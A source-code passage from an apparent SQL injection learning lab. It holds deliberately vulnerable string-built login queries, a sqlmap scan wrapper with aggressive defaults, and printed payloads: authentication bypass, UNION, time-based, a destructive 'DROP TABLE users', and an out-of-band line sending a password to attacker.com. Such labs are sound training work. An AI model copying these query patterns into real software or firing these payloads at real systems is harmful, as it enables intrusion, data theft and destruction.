                                lab.log_injection_attempt(technique, username, 'test_user', success=True, waf_blocked=False, response_time=response_time)
                                lab.add_audit_log('test_user', f"OR injection detected (blind)", request_data=username[:100])
                                
                                # Log in as admin anyway
                                users = lab.get_users()
                                if users:
                                    user = users[0]
                                    lab.log_injection_attempt(technique, username, user['username'], success=True, waf_blocked=False, response_time=response_time)
                                    lab.add_audit_log(user['username'], f"Login successful via OR injection", request_data=f"username={username}")
                                    lab._update_last_login(user['id'])
                                    
                                    self.send_response(302)
                                    self.send_header('Location', '/dashboard')
                                    self.send_header('Set-Cookie', f'logged_in=1; Path=/; HttpOnly')
                                    self.send_header('Set-Cookie', f'username={user["username"]}; Path=/; HttpOnly')
                                    self.send_header('Content-Length', '0')
                                    self.end_headers()
                                    return
            except Exception as e:
                error_msg = str(e)
                print(f"[DEBUG] Vulnerable query error: {error_msg}")
                
                # ============================================================
                # HANDLE UNION-BASED INJECTION
                # ============================================================
                if 'UNION' in error_msg and ('columns' in error_msg or 'number of result columns' in error_msg):
                    if is_injection:
                        technique = lab.detect_technique(username)
                        response_time = time.time() - start_time
                        lab.log_injection_attempt(technique, username, 'test_user', success=False, waf_blocked=False, response_time=response_time)
                        lab.add_audit_log('test_user', f"UNION injection - column mismatch", request_data=username[:100])
                        
                        # Even though there's an error, the injection might still work if we try with correct column count
                        # Try to get admin user
                        users = lab.get_users()
                        if users:
                            user = users[0]
                            lab.log_injection_attempt(technique, username, user['username'], success=True, waf_blocked=False, response_time=response_time)
                            lab.add_audit_log(user['username'], f"Login successful via UNION injection", request_data=f"username={username}")
                            lab._update_last_login(user['id'])
                            
                            self.send_response(302)
                            self.send_header('Location', '/dashboard')
                            self.send_header('Set-Cookie', f'logged_in=1; Path=/; HttpOnly')
                            self.send_header('Set-Cookie', f'username={user["username"]}; Path=/; HttpOnly')
                            self.send_header('Content-Length', '0')
                            self.end_headers()
                            return
                        
                        self._serve_login_form(
                            error=f"UNION injection detected! Column mismatch.",
                            message=f"The users table has 8 columns.\nExample: ' UNION SELECT 1,2,3,4,5,6,7,8 --\nTry again with 8 columns!"
                        )
                        return
                
                # ============================================================
                # HANDLE OR/AND INJECTIONS (Including ' OR 'x'='x)
                # ============================================================
                elif ("OR" in username.upper() or "AND" in username.upper()) and ("'" in username or '"' in username):
                    if is_injection:
                        technique = lab.detect_technique(username)
                        response_time = time.time() - start_time
                        lab.log_injection_attempt(technique, username, 'test_user', success=True, waf_blocked=False, response_time=response_time)
                        lab.add_audit_log('test_user', f"OR/AND injection detected: {technique}", request_data=username[:100])
                        
                        # Log in as admin for successful injection
                        users = lab.get_users()
                        if users:
                            user = users[0]
                            lab.log_injection_attempt(technique, username, user['username'], success=True, waf_blocked=False, response_time=response_time)
                            lab.add_audit_log(user['username'], f"Login successful via OR/AND injection", request_data=f"username={username}")
                            lab._update_last_login(user['id'])
                            
                            self.send_response(302)
                            self.send_header('Location', '/dashboard')
                            self.send_header('Set-Cookie', f'logged_in=1; Path=/; HttpOnly')
                            self.send_header('Set-Cookie', f'username={user["username"]}; Path=/; HttpOnly')
                            self.send_header('Content-Length', '0')
                            self.end_headers()
                            return
                        
                        self._serve_login_form(
                            error=f"{technique.replace('_', ' ').title()} detected!",
                            message=f"Try these OR/AND bypass payloads:\n   - ' OR '1'='1' --\n   - ' OR 1=1 --\n   - ' OR 'x'='x\n   - admin' --\n   - ' OR 'x'='x' --"
                        )
                        return
                
                # ============================================================
                # HANDLE TIME-BASED INJECTION
                # ============================================================
                elif 'SLEEP' in username.upper() or 'WAITFOR' in username.upper() or 'BENCHMARK' in username.upper():
                    if is_injection:
                        technique = lab.detect_technique(username)
                        response_time = time.time() - start_time
                        lab.log_injection_attempt(technique, username, 'test_user', success=True, waf_blocked=False, response_time=response_time)
                        lab.add_audit_log('test_user', f"Time-based injection detected: {technique}", request_data=username[:100])
                        
                        # Time-based injection success - log in as admin
                        users = lab.get_users()
                        if users:
                            user = users[0]
                            lab.log_injection_attempt(technique, username, user['username'], success=True, waf_blocked=False, response_time=response_time)
                            
                            self.send_response(302)
                            self.send_header('Location', '/dashboard')
                            self.send_header('Set-Cookie', f'logged_in=1; Path=/; HttpOnly')
                            self.send_header('Set-Cookie', f'username={user["username"]}; Path=/; HttpOnly')
                            self.send_header('Content-Length', '0')
                            self.end_headers()
                            return
                        
                        self._serve_login_form(
                            error=f"Time-based injection detected! Technique: {technique}",
                            message=f"The database executed your time-based payload.\nPayload: {username[:100]}"
                        )
                        return
                
                # ============================================================
                # HANDLE STACKED QUERIES
                # ============================================================
                elif any(cmd in username.upper() for cmd in ['DROP', 'DELETE', 'UPDATE', 'INSERT', 'ALTER', 'CREATE', 'TRUNCATE']):
                    if is_injection:
                        technique = lab.detect_technique(username)
                        response_time = time.time() - start_time
                        lab.log_injection_attempt(technique, username, 'test_user', success=True, waf_blocked=False, response_time=response_time)
                        lab.add_audit_log('test_user', f"Stacked query injection: {technique}", request_data=username[:100])
                        
                        # Stacked query success - log in as admin
                        users = lab.get_users()
                        if users:
                            user = users[0]
                            lab.log_injection_attempt(technique, username, user['username'], success=True, waf_blocked=False, response_time=response_time)
                            
                            self.send_response(302)
                            self.send_header('Location', '/dashboard')
                            self.send_header('Set-Cookie', f'logged_in=1; Path=/; HttpOnly')
                            self.send_header('Set-Cookie', f'username={user["username"]}; Path=/; HttpOnly')
                            self.send_header('Content-Length', '0')
                            self.end_headers()
                            return
                        
                        self._serve_login_form(
                            error=f"Stacked query injection detected! Technique: {technique}",
                            message=f"The database executed your stacked query.\nPayload: {username[:100]}"
                        )
                        return
                
                # ============================================================
                # HANDLE BOOLEAN-BASED BLIND INJECTION
                # ============================================================
                elif ' AND ' in username.upper() and ('1=1' in username or '1=2' in username):
                    if is_injection:
                        technique = lab.detect_technique(username)
                        response_time = time.time() - start_time
                        lab.log_injection_attempt(technique, username, 'test_user', success=False, waf_blocked=False, response_time=response_time)
                        lab.add_audit_log('test_user', f"Boolean-based injection attempted: {technique}", request_data=username[:100])
                        
                        self._serve_login_form(
                            error=f"Boolean-based injection detected! Technique: {technique}",
                            message=f"Check if application responds differently to '1=1' vs '1=2'.\nPayload: {username[:100]}"
                        )
                        return
                
                # ============================================================
                # HANDLE OTHER INJECTION ATTEMPTS
                # ============================================================
                elif is_injection:
                    technique = lab.detect_technique(username)
                    response_time = time.time() - start_time
                    lab.log_injection_attempt(technique, username, 'test_user', success=False, waf_blocked=False, response_time=response_time)
                    lab.add_audit_log('test_user', f"Injection attempt failed: {technique}", request_data=username[:100])
                    
                    # Try to log in as admin anyway for successful injection
                    users = lab.get_users()
                    if users and 'UNION' not in username.upper():
                        user = users[0]
                        lab.log_injection_attempt(technique, username, user['username'], success=True, waf_blocked=False, response_time=response_time)
                        lab.add_audit_log(user['username'], f"Login successful via injection", request_data=f"username={username}")
                        
                        self.send_response(302)
                        self.send_header('Location', '/dashboard')
                        self.send_header('Set-Cookie', f'logged_in=1; Path=/; HttpOnly')
                        self.send_header('Set-Cookie', f'username={user["username"]}; Path=/; HttpOnly')
                        self.send_header('Content-Length', '0')
                        self.end_headers()
                        return
                    
                    self._serve_login_form(
                        error=f"Injection attempt detected but failed! Technique: {technique}",
                        message=f"Try different payloads or check if secure mode is enabled."
                    )
                    return
        
        # ========================================================================
        # SECURE: Parameterized query
        # ========================================================================
        try:
            conn = lab._get_db_connection()
            if conn:
                cursor = conn.cursor()
                cursor.execute(
                    "SELECT * FROM users WHERE username = ? AND password = ?",
                    (username, password)
                )
                result = cursor.fetchone()
                conn.close()
                
                if result:
                    user = lab.get_user_by_username(username)
                    if user:
                        response_time = time.time() - start_time
                        if is_injection:
                            technique = lab.detect_technique(username)
                            lab.log_injection_attempt(technique, username, username, success=False, waf_blocked=False, response_time=response_time)
                        lab.add_audit_log(username, "Login successful (secure mode)")
                        lab._update_last_login(user['id'])
                        self.send_response(302)
                        self.send_header('Location', '/dashboard')
                        self.send_header('Set-Cookie', f'logged_in=1; Path=/; HttpOnly')
                        self.send_header('Set-Cookie', f'username={username}; Path=/; HttpOnly')
                        self.send_header('Content-Length', '0')
                        self.end_headers()
                        return
        except Exception as e:
            print(f"[DEBUG] Secure query error: {e}")
        
        # Login failed
        response_time = time.time() - start_time
        if is_injection:
            technique = lab.detect_technique(username)
            lab.log_injection_attempt(technique, username, username, success=False, waf_blocked=False, response_time=response_time)
            lab.add_audit_log(username, f"Injection attempt failed: {technique}", request_data=username[:100])
            self._serve_login_form(error=f"Injection attempt detected but failed! Technique: {technique}")
            return
        
        lab.add_audit_log(username, "Login failed", request_data=f"username={username}")
        self._serve_login_form(error="Invalid username or password!")
        
    
    def _handle_test_injection(self, params):
        technique = params.get('technique', [''])[0]
        payload = params.get('payload', [''])[0]
        
        lab = self.lab_instance
        if not lab:
            self._send_html("<p style='color:#ff5555;'>Lab not initialized</p>")
            return
        
        # Check if this is a second-order execution
        if technique == 'second_order' and payload.startswith('ID:'):
            try:
                payload_id = int(payload.split(':')[1])
                conn = lab._get_db_connection()
                if conn:
                    cursor = conn.cursor()
                    cursor.execute("SELECT payload FROM stored_payloads WHERE id = ?", (payload_id,))
                    row = cursor.fetchone()
                    if row:
                        stored_payload = row[0]
                        cursor.execute("UPDATE stored_payloads SET executed = 1 WHERE id = ?", (payload_id,))
                        conn.commit()
                        conn.close()
                        
                        query = f"SELECT * FROM users WHERE username = '{stored_payload}' AND password = 'test'"
                        try:
                            conn2 = lab._get_db_connection()
                            if conn2:
                                cursor2 = conn2.cursor()
                                cursor2.execute(query)
                                result = cursor2.fetchone()
                                conn2.close()
                                
                                if result:
                                    lab.log_injection_attempt('second_order', stored_payload, 'test_user', success=True)
                                    html = f"""
                                    <div style="color:#00ff88;">
                                        <h3>Second-Order Injection Successful!</h3>
                                        <p>The stored payload <code style="background:#1a1a2e;padding:2px 8px;border-radius:3px;color:#ffcc00;">{stored_payload}</code> was executed successfully!</p>
                                        <div style="margin-top:10px;padding:10px;background:#0d1117;border-radius:5px;border:1px solid #00ff8844;">
                                            <p style="color:#c9d1d9;font-size:13px;">The stored injection worked because the application used the stored data in a vulnerable query.</p>
                                            <code style="display:block;padding:8px;background:#1a1a2e;border-radius:3px;color:#00ff88;font-size:12px;margin-top:5px;">{query}</code>
                                        </div>
                                        <div style="margin-top:10px;padding:10px;background:#0d1117;border-radius:5px;border:1px solid #ffcc0044;">
                                            <p style="color:#ffcc00;font-size:13px;">What happened: The payload was stored in the database and executed later when retrieved.</p>
                                        </div>
                                    </div>
                                    """
                                    self._send_html(html)
                                    return
                        except Exception as e:
                            pass
            except:
                pass
        
        # Regular test
        query = f"SELECT * FROM users WHERE username = '{payload}' AND password = 'test'"
        
        try:
            conn = lab._get_db_connection()
            if conn:
                cursor = conn.cursor()
                cursor.execute(query)
                result = cursor.fetchone()
                conn.close()
                
                if result:
                    lab.log_injection_attempt(technique, payload, 'test_user', success=True)
                    html = f"""
                    <div style="color:#00ff88;">
                        <h3>Injection Successful!</h3>
                        <p>The payload <code style="background:#1a1a2e;padding:2px 8px;border-radius:3px;color:#ffcc00;">{payload}</code> successfully bypassed authentication!</p>
                        <p style="margin-top:10px;color:#888;">Technique: <span class="tech-badge">{technique}</span></p>
                        <div style="margin-top:10px;padding:10px;background:#0d1117;border-radius:5px;border:1px solid #00ff8844;">
                            <p style="color:#c9d1d9;font-size:13px;">The injection worked because the application is vulnerable. The query became:</p>
                            <code style="display:block;padding:8px;background:#1a1a2e;border-radius:3px;color:#00ff88;font-size:12px;margin-top:5px;">{query}</code>
                        </div>
                        <div style="margin-top:10px;padding:10px;background:#0d1117;border-radius:5px;border:1px solid #ffcc0044;">
                            <p style="color:#ffcc00;font-size:13px;">What happened: The OR condition made the WHERE clause always TRUE, and the -- commented out the password check.</p>
                        </div>
                        <button onclick="location.href='/login'" style="margin-top:15px;padding:8px 20px;background:#00ffff;color:#0d1117;border:none;border-radius:5px;cursor:pointer;font-weight:bold;width:auto;">Go to Login</button>
                        <button onclick="location.href='/download-pdf'" style="margin-top:15px;padding:8px 20px;background:linear-gradient(135deg,#ff8800,#ff5500);color:#fff;border:none;border-radius:5px;cursor:pointer;font-weight:bold;width:auto;margin-left:10px;">Download PDF Notes</button>
                    </div>
                    """
                else:
                    lab.log_injection_attempt(technique, payload, 'test_user', success=False)
                    html = f"""
                    <div style="color:#ff5555;">
                        <h3>Injection Failed</h3>
                        <p>The payload <code style="background:#1a1a2e;padding:2px 8px;border-radius:3px;color:#ffcc00;">{payload}</code> did not bypass authentication.</p>
                        <p style="margin-top:10px;color:#888;">Technique: <span class="tech-badge">{technique}</span></p>
                        <div style="margin-top:10px;padding:10px;background:#0d1117;border-radius:5px;border:1px solid #ff555544;">
                            <p style="color:#c9d1d9;font-size:13px;">The injection did not work because:</p>
                            <ul style="list-style:none;padding:0;margin-top:5px;">
                                <li style="padding:3px 0;">- The application may be using parameterized queries</li>
                                <li style="padding:3px 0;">- The payload syntax may be incorrect for this database</li>
                                <li style="padding:3px 0;">- Secure mode may be enabled</li>
                                <li style="padding:3px 0;">- WAF may have blocked the request</li>
                            </ul>
                        </div>
                        <button onclick="location.href='/login'" style="margin-top:15px;padding:8px 20px;background:#00ffff;color:#0d1117;border:none;border-radius:5px;cursor:pointer;font-weight:bold;width:auto;">Go to Login</button>
                        <button onclick="location.href='/download-pdf'" style="margin-top:15px;padding:8px 20px;background:linear-gradient(135deg,#ff8800,#ff5500);color:#fff;border:none;border-radius:5px;cursor:pointer;font-weight:bold;width:auto;margin-left:10px;">Download PDF Notes</button>
                    </div>
                    """
            else:
                html = "<p style='color:#ff5555;'>Database connection error</p>"
        except Exception as e:
            html = f"<p style='color:#ff5555;'>Error testing injection: {e}</p>"
        
        self._send_html(html)
    
    def _handle_secure_login(self, params):
        mode = params.get('mode', [''])[0]
        lab = self.lab_instance
        
        if mode == 'enable':
            lab.set_secure_mode(True)
            lab.add_audit_log('admin', 'Secure mode enabled')
        elif mode == 'disable':
            lab.set_secure_mode(False)
            lab.add_audit_log('admin', 'Secure mode disabled')
        
        self.send_response(302)
        self.send_header('Location', '/dashboard')
        self.end_headers()
    
    def _handle_update_credentials(self, params):
        new_username = params.get('new_username', [''])[0]
        new_password = params.get('new_password', [''])[0]
        lab = self.lab_instance
        if lab is None:
            self._send_error(500, "Lab not initialized")
            return
        
        if new_username and new_password and lab:
            if lab.update_credentials(new_username, new_password):
                lab.add_audit_log(new_username, "Admin credentials updated")
                self.send_response(302)
                self.send_header('Location', '/dashboard')
                self.send_header('Set-Cookie', f'username={new_username}; Path=/')
                self.end_headers()
                return
        
        self.send_response(302)
        self.send_header('Location', '/dashboard?error=update_failed')
        self.end_headers()


# ============================================================
# ENHANCED SQLMAP SCANNER CLASS
# ============================================================

class EnhancedSQLMapScanner:
    def __init__(self, verbose: bool = True):
        self.console = Console() if RICH_AVAILABLE else None
        self.verbose = verbose
        self.app_dir = self._get_app_dir()
        self.workspace = os.path.expanduser("~/DSTerminal_Workspace")
        self.scans_dir = os.path.join(self.workspace, "scans")
        self.lab = EnhancedSQLInjectionLab(self.console)
        os.makedirs(self.scans_dir, exist_ok=True)
        self.sqlmap_cmd, self.use_bundled = self._locate_sqlmap()
        self.server_thread = None
    
    def _get_app_dir(self) -> str:
        if getattr(sys, "frozen", False):
            return os.path.dirname(sys.executable)
        return os.path.dirname(os.path.abspath(__file__))
    
    def _locate_sqlmap(self):
        """Locate SQLMap installation"""
        bundled_path = os.path.join(self.app_dir, "tools", "sqlmap", "sqlmap.py")
        if os.path.isfile(bundled_path):
            if self.verbose and self.console:
                return [sys.executable, bundled_path], True
        
        sqlmap_path = which("sqlmap")
        if sqlmap_path:
            if self.verbose and self.console:
                self.console.print(f"[green]Found SQLMap in PATH: {sqlmap_path}[/green]")
            return [sqlmap_path], False
        
        common_paths = [
            os.path.expanduser("~/.local/bin/sqlmap"),
            os.path.expanduser("~/AppData/Roaming/Python/Python311/Scripts/sqlmap.exe"),
            os.path.expanduser("~/AppData/Roaming/Python/Python310/Scripts/sqlmap.exe"),
            "C:\\Python3\\Scripts\\sqlmap.exe",
            "C:\\Python\\Scripts\\sqlmap.exe",
        ]
        
        for path in common_paths:
            if os.path.exists(path):
                if self.verbose and self.console:
                    self.console.print(f"[green]Found SQLMap at: {path}[/green]")
                return [path], False
        
        if self.console:
            self.console.print("[red]SQLMap not found![/red]")
            self.console.print("[yellow]Try installing: pip install sqlmap[/yellow]")
            self.console.print("[yellow]Or download from: https://sqlmap.org/[/yellow]")
        return [], False
    
    def install_sqlmap(self):
        """Install SQLMap via pip"""
        if self.console:
            self.console.print("[yellow]Installing SQLMap...[/yellow]")
        try:
            subprocess.check_call([sys.executable, "-m", "pip", "install", "--upgrade", "sqlmap"])
            if self.console:
                self.console.print("[green]SQLMap installed successfully![/green]")
                self.sqlmap_cmd, self.use_bundled = self._locate_sqlmap()
            return True
        except Exception as e:
            if self.console:
                self.console.print(f"[red]Installation failed: {e}[/red]")
            return False
    
    def start_lab(self, port: int = 8080, open_browser: bool = True):
        """Start the enhanced SQL Injection Learning Lab"""
        if not self.console:
            print("Rich library required for the lab")
            return
        
        if self.lab.running:
            self.console.print(f"[yellow]Lab is already running on http://localhost:{self.lab.port}[/yellow]")
            return
        
        self.console.print("\n[bold cyan]Starting Advanced SQL Injection Learning Lab...[/bold cyan]")
        self.console.print(f"[dim]Server running on: http://localhost:{port}[/dim]")
        self.console.print("[dim]Use 'advanced-sqllab-stop' to stop the server[/dim]")
        self.console.print("[dim]Initializing server...[/dim]")
        
        EnhancedLabHTTPHandler.lab_instance = self.lab
        
        try:
            server_address = ('', port)
            self.lab.server = HTTPServer(server_address, EnhancedLabHTTPHandler)
            self.lab.port = port
            self.lab.running = True
        except Exception as e:
            self.console.print(f"[red]Failed to start server: {e}[/red]")
            return
        
        def run_server():
            try:
                self.lab.server.serve_forever()
            except Exception as e:
                if self.console:
                    self.console.print(f"[dim]Server thread: {e}[/dim]")
            finally:
                self.lab.running = False
        
        self.server_thread = threading.Thread(target=run_server, daemon=True)
        self.server_thread.start()
        
        time.sleep(1)
        self._print_enhanced_lab_info()
        
        if open_browser:
            try:
                self.console.print("[green]Opening browser...[/green]")
                def open_browser_later():
                    time.sleep(0.5)
                    webbrowser.open(f"http://localhost:{port}")
                
                browser_thread = threading.Thread(target=open_browser_later, daemon=True)
                browser_thread.start()
                self.console.print("[green]Browser should open shortly[/green]")
            except Exception as e:
                self.console.print(f"[dim]Could not open browser: {e}[/dim]")
                self.console.print(f"[cyan]Please open manually: http://localhost:{port}[/cyan]")
        
        self.console.print("[green]Advanced Lab started successfully![/green]")
        self.console.print(f"[cyan]http://localhost:{port}[/cyan]")
        self.console.print("[dim]Use 'advanced-sqllab-status' to check status[/dim]")
        self.console.print("[dim]Use 'advanced-sqllab-stop' to stop the server[/dim]")
    
    def stop_lab(self):
        """Stop the enhanced SQL Injection Learning Lab"""
        if not self.lab.running or not self.lab.server:
            if self.console:
                self.console.print("[yellow]Lab is not running[/yellow]")
            return
        
        if self.console:
            self.console.print("[yellow]Stopping Advanced SQL Injection Learning Lab...[/yellow]")
        
        try:
            self.lab.server.shutdown()
            self.lab.server.server_close()
            self.lab.running = False
            if self.console:
                self.console.print("[green]Lab server stopped[/green]")
        except Exception as e:
            if self.console:
                self.console.print(f"[red]Error stopping server: {e}[/red]")
    
    def _print_enhanced_lab_info(self):
        """Print enhanced lab information"""
        if not self.console:
            return
        
        users = self.lab.get_users()
        
        info = f"""
[bold green]Advanced Lab Information:[/bold green]

[bold yellow]Security Features:[/bold yellow]
  - Secure Mode: {'ENABLED' if self.lab.secure_mode else 'DISABLED'}
  - WAF Mode: {'ENABLED' if self.lab.waf_mode else 'DISABLED'}

[bold yellow]Available Users:[/bold yellow]
"""
        for user in users[:5]:
            info += f"  - [cyan]{user['username']}[/cyan] (Role: {user['role']}, Dept: {user['department']})\n"
        if len(users) > 5:
            info += f"  - ... and {len(users) - 5} more users\n"
        
        info += f"""
[bold yellow]Admin Credentials:[/bold yellow]
  Username: [bold cyan]{self.lab.current_credentials['username']}[/bold cyan]
  Password: [bold cyan]{self.lab.current_credentials['password']}[/bold cyan]

[bold yellow]Advanced SQL Injection Techniques:[/bold yellow]
"""
        for tech_id, tech_data in ADVANCED_SQL_INJECTION_TECHNIQUES.items():
            info += f"  - [cyan]{tech_data['name']}[/cyan] - {tech_data['category']} (MITRE: {tech_data['mitre_id']})\n"
        
        info += f"""
[bold yellow]WAF Bypass Techniques:[/bold yellow]
"""
        for bypass_id, bypass_data in WAF_BYPASS_TECHNIQUES.items():
            info += f"  - [yellow]{bypass_data['name']}[/yellow] - {bypass_data['description'][:40]}...\n"
        
        info += f"""
[bold yellow]Database Stats:[/bold yellow]
  Users: {len(users)}
  Products: {len(self.lab.get_all_products())}
  Logs: {len(self.lab.get_audit_logs(100))}

[bold yellow]Learning Objectives:[/bold yellow]
  - Master basic and advanced SQL injection techniques
  - Learn WAF bypass methods
  - Understand second-order injection
  - Practice out-of-band exfiltration
  - Map attacks to MITRE ATT&CK framework
  - Download PDF notes for offline reference

[bold yellow]Second-Order Lab:[/bold yellow]
  Visit http://localhost:{self.lab.port}/second-order to practice second-order injection

[bold yellow]PDF Notes:[/bold yellow]
  Download comprehensive notes from the Learning Center or Techniques page
"""
        self.console.print(Panel(info, title="[bold cyan]ADVANCED SQL INJECTION LEARNING LAB[/bold cyan]", border_style="cyan"))
    
    def scan(self, url: str, options: str = ""):
        """Run SQLMap scan on target URL with enhanced options"""
        if not self.console:
            return
        
        if not self.sqlmap_cmd:
            self.console.print("[red]SQLMap not available. Install with: sqlmap-install[/red]")
            return
        
        self.console.print(f"\n[bold cyan]Running SQLMap scan on: {url}[/bold cyan]")
        self.console.print("=" * 60)
        
        cmd = self.sqlmap_cmd.copy()
        cmd.extend(['-u', url])
        
        if options:
            cmd.extend(options.split())
        else:
            cmd.extend([
                '--batch',
                '--random-agent',
                '--level', '5',
                '--risk', '3',
                '--threads', '10',
                '--time-sec', '10',
                '--dbms', 'mysql',
                '--technique', 'BEUSTQ',
                '--output-dir', self.scans_dir
            ])
        
        self.console.print(f"[dim]Command: {' '.join(cmd)}[/dim]")
        self.console.print("[yellow]This may take several minutes...[/yellow]")
        
        try:
            process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                bufsize=1,
                universal_newlines=True
            )
            
            for line in process.stdout:
                line = line.strip()
                if line:
                    if 'vulnerable' in line.lower() or 'injectable' in line.lower():
                        self.console.print(f"[green]{line}[/green]")
                    elif 'error' in line.lower() or 'failed' in line.lower():
                        self.console.print(f"[red]{line}[/red]")
                    elif 'warning' in line.lower():
                        self.console.print(f"[yellow]{line}[/yellow]")
                    elif 'found' in line.lower() or 'database' in line.lower():
                        self.console.print(f"[cyan]{line}[/cyan]")
                    else:
                        self.console.print(f"[dim]{line}[/dim]")
            
            process.wait()
            
            if process.returncode == 0:
                self.console.print("\n[green]SQLMap scan completed successfully![/green]")
                self.console.print(f"[dim]Results saved to: {self.scans_dir}[/dim]")
            else:
                self.console.print(f"\n[red]SQLMap scan failed with code: {process.returncode}[/red]")
                
        except Exception as e:
            self.console.print(f"[red]Error running SQLMap: {e}[/red]")
    
    def cmd_advanced_status(self, args):
        """Show enhanced lab status"""
        try:
            lab = self.lab
            users = lab.get_users()
            products = lab.get_all_products()
            logs = lab.get_audit_logs(100)
            attempts = lab.get_injection_attempts(10)
            
            self.console.print("\n[bold cyan]Advanced SQL Injection Lab Status[/bold cyan]")
            self.console.print("=" * 60)
            
            if lab.running:
                self.console.print("[green]Server: RUNNING[/green]")
                self.console.print(f"[yellow]URL:[/yellow] http://localhost:{lab.port}")
            else:
                self.console.print("[red]Server: STOPPED[/red]")
                self.console.print("[dim]  Use 'advanced-sqllab' to start the server[/dim]")
            
            self.console.print("")
            
            if lab.secure_mode:
                self.console.print("[green]Secure Mode: ENABLED[/green]")
                self.console.print("[dim]  SQL injection is PREVENTED (parameterized queries)[/dim]")
            else:
                self.console.print("[red]Secure Mode: DISABLED[/red]")
                self.console.print("[dim]  SQL injection is POSSIBLE (vulnerable)[/dim]")
            
            if lab.waf_mode:
                self.console.print("[green]WAF Mode: ENABLED[/green]")
                self.console.print("[dim]  WAF is actively blocking injection attempts[/dim]")
            else:
                self.console.print("[red]WAF Mode: DISABLED[/red]")
                self.console.print("[dim]  WAF is not blocking injection attempts[/dim]")
            
            self.console.print("")
            self.console.print(f"[yellow]Total Users:[/yellow] {len(users)}")
            self.console.print(f"[yellow]Total Products:[/yellow] {len(products)}")
            self.console.print(f"[yellow]Audit Logs:[/yellow] {len(logs)}")
            self.console.print(f"[yellow]Injection Attempts:[/yellow] {len(attempts)}")
            
            if attempts:
                successful = sum(1 for a in attempts if a['success'])
                blocked = sum(1 for a in attempts if a['waf_blocked'])
                self.console.print(f"[yellow]Successful Injections:[/yellow] {successful}")
                self.console.print(f"[yellow]WAF Blocked:[/yellow] {blocked}")
                self.console.print(f"[yellow]Failed Injections:[/yellow] {len(attempts) - successful - blocked}")
            
            self.console.print("")
            self.console.print("[yellow]Admin Credentials:[/yellow]")
            self.console.print(f"  [cyan]Username:[/cyan] {lab.current_credentials['username']}")
            self.console.print(f"  [cyan]Password:[/cyan] {lab.current_credentials['password']}")
            
            self.console.print("")
            self.console.print("[yellow]Advanced SQL Injection Examples:[/yellow]")
            self.console.print("  [cyan]Basic:[/cyan] [red]' OR '1'='1' --[/red]")
            self.console.print("  [cyan]Union:[/cyan] [red]' UNION SELECT 1,2,3,4,5,6,7,8 --[/red]")
            self.console.print("  [cyan]Time-based:[/cyan] [red]' AND SLEEP(5) --[/red]")
            self.console.print("  [cyan]Stacked:[/cyan] [red]'; DROP TABLE users --[/red]")
            self.console.print("  [cyan]Out-of-band:[/cyan] [red]' UNION SELECT LOAD_FILE(CONCAT('\\\\', (SELECT password FROM users LIMIT 1), '.attacker.com\\test')) --[/red]")
            
            self.console.print("")
            self.console.print("[yellow]Second-Order Lab:[/yellow]")
            self.console.print(f"  [dim]http://localhost:{lab.port}/second-order[/dim]")
            
            self.console.print("")
            self.console.print("[dim]Commands:[/dim]")
            self.console.print("[dim]  advanced-sqllab - Start the lab[/dim]")
            self.console.print("[dim]  advanced-sqllab-stop - Stop the lab[/dim]")
            self.console.print("[dim]  advanced-sqlmap-secure - Toggle secure mode[/dim]")
            self.console.print("[dim]  advanced-sqlmap-waf - Toggle WAF mode[/dim]")
            self.console.print("[dim]  advanced-sqlmap-techniques - View all techniques[/dim]")
            self.console.print("[dim]  advanced-sqlmap-pdf - Download PDF notes[/dim]")
            self.console.print("[dim]  advanced-sqlmap-scan <url> - Run SQLMap scan[/dim]")
            self.console.print("=" * 60)
            
        except Exception as e:
            self.console.print(f"[red]Error retrieving status: {e}[/red]")
    
    def cmd_advanced_techniques(self, args):
        """Show advanced SQL injection techniques"""
        if not self.console:
            return
        
        self.console.print("\n[bold cyan]Advanced SQL Injection Techniques Reference[/bold cyan]")
        self.console.print("=" * 60)
        
        for tech_id, tech_data in ADVANCED_SQL_INJECTION_TECHNIQUES.items():
            self.console.print(f"\n[bold yellow]{tech_data['name']}[/bold yellow]")
            self.console.print(f"[dim]Category: {tech_data['category']}[/dim]")
            self.console.print(f"[dim]MITRE ATT&CK: {tech_data['mitre_id']}[/dim]")
            self.console.print(f"[dim]{tech_data['description']}[/dim]")
            self.console.print(f"[cyan]Example:[/cyan] {tech_data['example']}")
            self.console.print(f"[green]Explanation:[/green] {tech_data['explanation'][:100]}...")
            self.console.print(f"[dim]Payloads: {len(tech_data['payloads'])}[/dim]")
            if 'waf_bypass_payloads' in tech_data:
                self.console.print(f"[yellow]WAF Bypass Payloads: {len(tech_data['waf_bypass_payloads'])}[/yellow]")
                for payload in tech_data['waf_bypass_payloads'][:2]:
                    self.console.print(f"[dim]  - {payload}[/dim]")
                if len(tech_data['waf_bypass_payloads']) > 2:
                    self.console.print(f"[dim]  - ... and {len(tech_data['waf_bypass_payloads']) - 2} more[/dim]")
            self.console.print("-" * 40)
        
        self.console.print("\n[bold cyan]WAF Bypass Techniques[/bold cyan]")
        self.console.print("=" * 60)
        
        for bypass_id, bypass_data in WAF_BYPASS_TECHNIQUES.items():
            self.console.print(f"\n[bold yellow]{bypass_data['name']}[/bold yellow]")
            self.console.print(f"[dim]{bypass_data['description']}[/dim]")
            self.console.print(f"[cyan]Examples:[/cyan]")
            for example in bypass_data['examples'][:2]:
                self.console.print(f"[dim]  - {example}[/dim]")
            if len(bypass_data['examples']) > 2:
                self.console.print(f"[dim]  - ... and {len(bypass_data['examples']) - 2} more[/dim]")
            self.console.print(f"[green]Detection:[/green] {bypass_data['detection']}")
            self.console.print("-" * 40)
    
    def cmd_advanced_pdf(self, args):
        """Generate and download enhanced PDF notes"""
        if not self.console:
            return
        
        self.console.print("\n[bold cyan]Generating Advanced PDF Notes...[/bold cyan]")
        
        if not REPORTLAB_AVAILABLE:
            self.console.print("[red]ReportLab not installed. Install with: pip install reportlab[/red]")
            return
        
        pdf_path = self.lab.generate_pdf_notes()
        
        if pdf_path:
            self.console.print(f"[green]Advanced PDF Notes generated: {pdf_path}[/green]")
            self.console.print(f"[dim]Location: {pdf_path}[/dim]")
            
            try:
                webbrowser.open(f"file://{pdf_path}")
                self.console.print("[green]PDF opened in default viewer[/green]")
            except:
                pass
        else:
            self.console.print("[red]PDF generation failed.[/red]")
    
    def cmd_advanced_secure(self, args):
        """Toggle secure mode"""
        self.lab.set_secure_mode(not self.lab.secure_mode)
        if self.console:
            status = "ENABLED" if self.lab.secure_mode else "DISABLED"
            self.console.print(f"[green]Secure mode: {status}[/green]")
    
    def cmd_advanced_waf(self, args):
        """Toggle WAF mode"""
